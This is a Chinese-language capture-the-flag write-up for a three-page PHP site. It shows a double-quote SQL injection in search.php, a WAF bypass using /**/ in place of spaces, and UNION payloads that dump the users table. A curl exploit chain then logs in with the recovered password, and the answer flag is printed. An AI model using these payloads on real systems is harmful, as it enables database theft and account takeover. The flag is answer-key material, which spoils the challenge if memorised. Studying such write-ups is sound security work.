## 题解

### 入口与指纹

`Apache/2.4.54` + `PHP/7.4.33`，一个只有三个页面的 PHP 站：
`index.php`（功能列表）、`login.php`、`search.php`。

`search.php` 提交 `username` 后回显：

```text
User exists: admin        （存在）
No results                （查询成功但没有行）
some item is filtered!    （WAF）
```

### 关键观察

**1. 之前判定「参数化」是错的：查询用的是双引号。**

单引号被转义（`admin'` → `No results`），但**双引号没有**：

```text
username=admin"#                      → User exists: admin
username=admin"/**/or/**/1=1#         → User exists: admin
username=admin"/**/union/**/select/**/1,2,3#  → User exists: admin / User exists: 2
```

WAF 拦的是「空格 + `and`/`or`」等字面量，用 `/**/` 替代空格即可。
`#` 可以正常注释掉后半段。

**2. 列数是 3，第 2 列会被回显成 “User exists: …”。**

```text
admin"/**/union/**/select/**/1,@@version,3#        → 5.7.15
admin"/**/union/**/select/**/1,database(),3#       → ctf
admin"/**/union/**/select/**/1,current_user(),3#   → ctfuser@172.18.0.3
```

**3. 直接拖出 users 表。**

```sql
admin"/**/union/**/select/**/1,
  group_concat(concat_ws(0x3a,id,username,password)),3/**/from/**/users#
```

```text
1:admin:ThisIsBestPassword
```

### 利用链

```bash
T=$(head -1 .target)

# 1. 确认注入（双引号 + /**/）
curl -sS -X POST --data-urlencode 'username=admin"/**/or/**/1=1#' \
  "http://$T/search.php"

# 2. 拖 users 表
curl -sS -X POST --data-urlencode \
  'username=admin"/**/union/**/select/**/1,group_concat(concat_ws(0x3a,id,username,password)),3/**/from/**/users#' \
  "http://$T/search.php"

# 3. 用拿到的口令登录，登录响应正文直接给 flag
curl -sS -X POST --data-urlencode 'username=admin' \
  --data-urlencode 'password=ThisIsBestPassword' "http://$T/login.php"
```

登录响应：

```text
Congratz, flag is flag{14f3fa70-6132-4570-985c-f9dfcdc6db26}
```

### flag 位置

`login.php` 登录成功后的响应体（不需要进任何后台页面）。

## 复盘

- **「引号被转义」只对某一种引号成立。** 这里 `'` 被转义、`"` 没有；
  早期只测单引号就得出「参数化」的结论，多花了整整一轮。
- **WAF 是表层过滤，先画黑名单再选语法。** `/**/` 替空格、`#` 收尾即可；
  `and`/`or` 被拦不代表 `union` 被拦。
- **注入点不止一条路：** 存在性 oracle（`User exists` / `No results`）让布尔盲注也可行，
  但 UNION 一次就能拖表，优先 UNION。
- 拖库后**先试口令复用**，本题登录成功即给 flag，不用再找后台。
